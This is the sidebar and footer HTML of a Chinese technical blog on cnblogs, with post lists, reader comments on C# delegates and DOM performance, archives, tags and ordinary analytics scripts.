                <li><a href="https://www.cnblogs.com/hyddd/p/7689132.html">浅析Diffie–Hellman</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/7132187.html">SSIM（结构相似度算法）不同实现版本的差异</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/6678930.html">某直播App问题分析</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/5995950.html">相机与摄影基础</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/5593479.html">Macaca-iOS入门那些事2</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/5571229.html">Macaca-iOS入门那些事</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/5329608.html">iOS instruments trace文件解析方案</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/4932595.html">关于QCon2015感想与反思</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/4402621.html">深入浅出Android App耗电量统计</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/4237099.html">透析Express.js</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/4126979.html">Robotium的左右为难 -- enterText</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/p/3995281.html">Android Instrumention.sendPointerSync发送Event失败分析</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/02/23/2923879.html">产品设计：一层分类与多层分类模式的感悟</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/02/07/2908960.html">DOM性能瓶颈与Javascript性能优化</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/02/07/2908598.html">Javascript垃圾回收浅析</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/02/06/2908110.html">JS特性性能缺陷及JIT的解决方案</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/01/16/2862386.html">让NAS走下神坛</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2012/09/29/2708518.html">Gitorious基本配置流程</a></li>
        </ul>
    </div><div id="side-recent-comments">
        <h2>最新评论</h2>
        <ul class="voice">
                <li>
                    <a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html#4263830">Re:浅谈HTTP中Get与Post的区别</a>
                    <br>
                    <a class="child" href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html#4263830">
                        09年的博客到17年还有这么多人评论，而且作者还回复了！好，2019的我来了！
                        -- 张四海
                    </a>
                </li>
                <li>
                    <a href="https://www.cnblogs.com/hyddd/archive/2009/07/26/1531538.html#4100803">Re:谈C#中的Delegate</a>
                    <br>
                    <a class="child" href="https://www.cnblogs.com/hyddd/archive/2009/07/26/1531538.html#4100803">
                        二.Delegate和C++中函数指针的区别

    Delegate和C++中的函数指针很像，但如果深入对比，发现其实还是有区别的，区别主要有三个方面（参考Stanley B. Lippman的一篇文章）

      1) 一个 delegate对象一次可以搭载多个方法（methods），而不是一次一个。当我们唤起一个搭载了多个方法（methods）的delegate，所有方法以其“被搭载到delegate对象的顺序”被依次唤起。

      2) 一个delegate对象所搭载的方法（methods）并不需要属于同一个类别。一个delegate对象所搭载的所有方法（methods）必须具有相同的原型和形式。然而，这些方法（methods）可以即有static也有non-static，可以由一个或多个不同类别的成员组成。

      3) 一个delegate type的声明在本质上是创建了一个新的subtype instance，该 subtype 派生自 .NET library framework 的 abstract base classes Delegate 或 MulticastDelegate，它们提供一组public methods用以询访delegate对象或其搭载的方法（methods） ，与函数指针不同，委托是面向对象、类型安全并且安全的。




看到delegate，我也是想到native c/c++中的函数指针（回调函数等）
但是，这里将他们拿来做对比是不恰当的，

delegate是对象，c/c++中是一种指针类型。

对象就意味着是一个类的实例，自然有内部的封装，
c/c++也是可以模仿这样设计思维设计出一个类似delegate的东西，

所以直接拿来这么对比，有点不严谨
                        -- 仆人
                    </a>
                </li>
                <li>
                    <a href="https://www.cnblogs.com/hyddd/archive/2013/02/07/2908960.html#4065260">Re:DOM性能瓶颈与Javascript性能优化</a>
                    <br>
                    <a class="child" href="https://www.cnblogs.com/hyddd/archive/2013/02/07/2908960.html#4065260">
                        针对【3】来说，现代浏览器都会有比较聪明的优化。一般会维护一个队列，存放样式的更改，队列满了之后，或者时间到了以后（当然这个时间是相当于代码执行速度来说，是很短的），拿出队列里面的所有样式更改，进行统一的重排版。
                        -- james·von
                    </a>
                </li>
                <li>
                    <a href="https://www.cnblogs.com/hyddd/p/7132187.html#4062090">Re:SSIM（结构相似度算法）不同实现版本的差异</a>
                    <br>
                    <a class="child" href="https://www.cnblogs.com/hyddd/p/7132187.html#4062090">
                        感觉
滤波部分----&gt;结果矩阵中
Zhou Wang版本的结果矩阵应该是3x3的
                        -- dachuanxiong
                    </a>
                </li>
        </ul>
    </div></div>
            <div id="sideRight">
            <div id="side-archives">
        <h2>随笔档案</h2>
        <ul class="date">
                <li><a href="https://www.cnblogs.com/hyddd/archive/2019/07.html">2019年7月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2017/10.html">2017年10月(2)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2017/07.html">2017年7月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2017/04.html">2017年4月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2016/10.html">2016年10月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2016/06.html">2016年6月(2)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2016/03.html">2016年3月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2015/11.html">2015年11月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2015/04.html">2015年4月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2015/01.html">2015年1月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2014/11.html">2014年11月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2014/09.html">2014年9月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/02.html">2013年2月(4)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2013/01.html">2013年1月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2012/09.html">2012年9月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2012/03.html">2012年3月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2011/05.html">2011年5月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2011/02.html">2011年2月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2010/04.html">2010年4月(3)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2010/02.html">2010年2月(2)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2010/01.html">2010年1月(2)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/12.html">2009年12月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/11.html">2009年11月(3)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/10.html">2009年10月(1)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/09.html">2009年9月(6)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/08.html">2009年8月(9)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/07.html">2009年7月(5)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/06.html">2009年6月(3)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/05.html">2009年5月(14)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/04.html">2009年4月(5)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/03.html">2009年3月(4)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/02.html">2009年2月(2)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2009/01.html">2009年1月(5)</a></li>
                <li><a href="https://www.cnblogs.com/hyddd/archive/2008/12.html">2008年12月(6)</a></li>
        </ul>
    </div>    
    
    

    

    
    


</div>
            <div id="sideLeft">
            <div id="side-calendar">
        <h2>日历</h2>
        <div id="blog-calendar"><table id="blogCalendar" class="Cal" cellspacing="0" cellpadding="0" title="Calendar">
	<tbody><tr><td colspan="7"><table class="CalTitle" cellspacing="0">
		<tbody><tr><td class="CalNextPrev"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2009/06/01&#39;);return false;">&lt;</a></td><td align="center">2009年7月</td><td class="CalNextPrev" align="right"><a href="javascript:void(0);" onclick="loadBlogCalendar(&#39;2009/08/01&#39;);return false;">&gt;</a></td></tr>
	</tbody></table></td></tr><tr><th class="CalDayHeader" align="center" abbr="日" scope="col">日</th><th class="CalDayHeader" align="center" abbr="一" scope="col">一</th><th class="CalDayHeader" align="center" abbr="二" scope="col">二</th><th class="CalDayHeader" align="center" abbr="三" scope="col">三</th><th class="CalDayHeader" align="center" abbr="四" scope="col">四</th><th class="CalDayHeader" align="center" abbr="五" scope="col">五</th><th class="CalDayHeader" align="center" abbr="六" scope="col">六</th></tr><tr><td class="CalOtherMonthDay" align="center">28</td><td class="CalOtherMonthDay" align="center">29</td><td class="CalOtherMonthDay" align="center">30</td><td align="center">1</td><td align="center"><a href="https://www.cnblogs.com/hyddd/archive/2009/07/02.html"><u>2</u></a></td><td align="center">3</td><td class="CalWeekendDay" align="center">4</td></tr><tr><td class="CalWeekendDay" align="center"><a href="https://www.cnblogs.com/hyddd/archive/2009/07/05.html"><u>5</u></a></td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">10</td><td class="CalWeekendDay" align="center">11</td></tr><tr><td class="CalWeekendDay" align="center">12</td><td align="center">13</td><td align="center">14</td><td align="center">15</td><td align="center">16</td><td align="center">17</td><td class="CalWeekendDay" align="center">18</td></tr><tr><td class="CalWeekendDay" align="center">19</td><td align="center"><a href="https://www.cnblogs.com/hyddd/archive/2009/07/20.html"><u>20</u></a></td><td align="center">21</td><td align="center">22</td><td align="center">23</td><td align="center">24</td><td class="CalWeekendDay" align="center">25</td></tr><tr><td class="CalWeekendDay" align="center"><a href="https://www.cnblogs.com/hyddd/archive/2009/07/26.html"><u>26</u></a></td><td align="center">27</td><td align="center">28</td><td align="center">29</td><td align="center">30</td><td align="center">31</td><td class="CalOtherMonthDay" align="center">1</td></tr><tr><td class="CalOtherMonthDay" align="center">2</td><td class="CalOtherMonthDay" align="center">3</td><td class="CalOtherMonthDay" align="center">4</td><td class="CalOtherMonthDay" align="center">5</td><td class="CalOtherMonthDay" align="center">6</td><td class="CalOtherMonthDay" align="center">7</td><td class="CalOtherMonthDay" align="center">8</td></tr>
</tbody></table></div>
    </div><div id="side-hottags">
        <h2>我的标签</h2>
        <ul class="folder">
            <li><a href="https://www.cnblogs.com/hyddd/tag/hyddd%E7%9A%84FindBugs%E5%88%86%E6%9E%90%E8%AE%B0%E5%BD%95/">hyddd的FindBugs分析记录</a>(31)</li><li><a href="https://www.cnblogs.com/hyddd/tag/hyddd%E7%9A%84Fortify%20SCA%E5%88%86%E6%9E%90Java%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/">hyddd的Fortify SCA分析Java代码记录</a>(18)</li><li><a href="https://www.cnblogs.com/hyddd/tag/Selenium/">Selenium</a>(10)</li><li><a href="https://www.cnblogs.com/hyddd/tag/Oracle/">Oracle</a>(7)</li><li><a href="https://www.cnblogs.com/hyddd/tag/Test/">Test</a>(5)</li><li><a href="https://www.cnblogs.com/hyddd/tag/.Net/">.Net</a>(4)</li><li><a href="https://www.cnblogs.com/hyddd/tag/Java/">Java</a>(4)</li><li><a href="https://www.cnblogs.com/hyddd/tag/hyddd%E5%AE%89%E5%85%A8%E6%80%A7%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/">hyddd安全性测试笔记</a>(4)</li><li><a href="https://www.cnblogs.com/hyddd/tag/Macaca/">Macaca</a>(2)</li><li><a href="https://www.cnblogs.com/hyddd/tag/vim/">vim</a>(2)</li><li><a href="https://www.cnblogs.com/hyddd/tag/">更多</a></li>
        </ul>
    </div><div id="side-categories">
        <h2>随笔分类</h2>
        <ul class="folder">
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/168574.html">.NET(3)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/1030890.html">Algorithm(2)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/676094.html">Android(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/241259.html">Cache(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/180721.html">Driver(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/190986.html">Encrypt(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/168577.html">Java(5)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/168580.html">Linux/CentOS(5)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/172951.html">NetWork(3)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/197360.html">Oracle(10)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/168579.html">Others(15)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/218778.html">Python(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/169008.html">Ruby(1)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/168575.html">Security(17)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/190443.html">Test(17)</a>
                </li>
                <li>
                    
                    <a href="https://www.cnblogs.com/hyddd/category/232324.html">Web(5)</a>
                </li>
        </ul>
    </div><div id="side-top-posts-custom">
    <h2>推荐排行榜</h2>
    <div id="TopDiggPostsBlock"><ul><li><a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html">1. 浅谈HTTP中Get与Post的区别(199)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">2. 浅谈CSRF攻击方式(132)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/07/26/1531538.html">3. 谈C#中的Delegate(47)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/05/30/1492536.html">4. Selenium私房菜系列--总章(19)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/07/20/1526777.html">5. 浅析C#中的Attribute(17)</a></li></ul></div>
</div><div id="side-top-posts">
    <h2>阅读排行榜</h2>
    <div id="TopViewPostsBlock"><ul><li><a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html">1. 浅谈HTTP中Get与Post的区别(883839)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">2. 浅谈CSRF攻击方式(305313)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/07/26/1531538.html">3. 谈C#中的Delegate(136104)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/05/24/1487967.html">4. Selenium私房菜系列4 -- Selenium IDE的使用(73942)</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/05/30/1492536.html">5. Selenium私房菜系列--总章(61898)</a></li></ul></div>
</div></div>
            
                <div id="sideContainer"></div>
                <script type="text/javascript">
                    $.ajax({
                        url: '/' + currentBlogApp + '/mvc/blog/Minyx2_Lite_SideColumn.aspx',
                        data: '{}',
                        type: 'post',
                        dataType: 'text',
                        contentType: 'application/json; charset=utf-8',
                        success: function (data) {
                            if (data) {
                                $("#sideContainer").html(data);
                                loadBlogDefaultCalendar();
                                loadBlogSideBlocks();
                                var m = window.__blog.sideContainerRendered;
                                if (m) { m(__$("sideContainer")); }
                                window.__blog.sidebar.__layout();
                            }
                        }
                    });

                </script>
            
        </div>

        <script type="text/javascript">
            var m = window.__blog.sidebarRendered;
            if (m) { m(__$("sidebar")); }
        </script>

        <div id="footer">
            
<p id="logoFoot">
    <a href="http://www.spiga.com.mx/" title="Agencia Interactiva Spiga">www.spiga.com.mx</a>
</p>
<div class="footText">
<p>
Copyright ©2019 hyddd
</p>
<p>
<a href="http://www.cnblogs.com/">博客园</a>
</p>
</div>
        </div>
    </div>

    <script type="text/javascript">
        var m = window.__blog.wrapperRendered;
        if (m) { m(__$("wrapper")); }
    </script>

</div>
<script type="text/javascript">
    var m = window.__blog.containerRendered;
    if (m) { m(__$("container")); }
</script>



<script type="text/javascript">
//$('#lnkGallery').text("博客园");
//$('#lnkGallery').attr("href","/");
//$('#lnkHome').text("首页");
//$('#lnkContact').text("短消息");
</script><script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-39116562-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script><script type="text/javascript">getFollowStatus('9208470b-63cf-dd11-9e4d-001cf0cd104b')</script></body></html>